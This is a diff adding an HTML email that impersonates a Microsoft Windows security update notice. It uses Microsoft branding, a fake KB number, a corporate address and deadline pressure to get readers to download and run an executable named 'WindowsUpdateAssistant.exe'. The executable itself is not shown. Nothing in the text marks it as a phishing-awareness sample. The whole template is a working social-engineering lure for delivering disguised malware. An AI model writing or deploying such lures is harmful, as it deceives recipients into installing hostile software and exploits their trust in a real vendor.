@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Windows Security Update - Action Required</title>
+<style>
+body { font-family: 'Segoe UI', sans-serif; color: #333; max-width: 600px; margin: 0 auto; padding: 20px; background: #f5f5f5; }
+.container { background: white; border-radius: 4px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+.header { background: #0078d4; color: white; padding: 20px; border-radius: 4px 4px 0 0; }
+.header h2 { margin: 0; font-weight: 600; }
+.content { padding: 25px; }
+.button { background: #0078d4; color: white !important; padding: 14px 28px; text-decoration: none; border-radius: 4px; display: inline-block; margin: 20px 0; font-weight: 600; transition: background 0.2s; }
+.button:hover { background: #106ebe; }
+.footer { font-size: 11px; color: #666; padding: 15px 25px; border-top: 1px solid #eee; }
+.warning { background: #fff4ce; border-left: 4px solid #ffb900; padding: 12px 15px; margin: 20px 0; }
+.ms-logo { font-size: 24px; margin-right: 10px; }
+ol { padding-left: 20px; }
+ol li { margin: 8px 0; }
+</style>
+</head>
+<body>
+<div class="container">
+<div class="header">
+<h2><span class="ms-logo">&#x1F6E1;</span> Windows Security Update Required</h2>
+</div>
+<div class="content">
+<p>Dear User,</p>
+<p>A critical security update (<strong>KB5034441</strong>) requires manual installation on your device due to a known issue with the Windows Update service.</p>
+<div class="warning">
+<strong>⚠ Action Required:</strong> This update must be installed by end of business today to maintain compliance with security policy.
+</div>
+<p>This update addresses multiple critical vulnerabilities including kernel elevation of privilege and SmartScreen bypass issues.</p>
+<p style="text-align: center;">
+<a href="WindowsUpdateAssistant.exe" class="button" download>&#x2B07; Download Update Assistant</a>
+</p>
+<p><strong>Instructions:</strong></p>
+<ol>
+<li>Click the download button above</li>
+<li>Run <strong>WindowsUpdateAssistant.exe</strong></li>
+<li>Wait for the update to complete (2-3 minutes)</li>
+<li>No restart required</li>
+</ol>
+<p style="color: #666; font-size: 13px;">If the download doesn't start automatically, <a href="WindowsUpdateAssistant.exe" download>click here</a>.</p>
+</div>
+<div class="footer">
+<p>Microsoft Corporation | One Microsoft Way, Redmond, WA 98052</p>
+<p>This is an automated security notification. Do not reply to this email.</p>
+<p style="color: #999;">Ref: SEC-2024-KB5034441-CRIT</p>
+</div>
+</div>
+</body>
+</html>
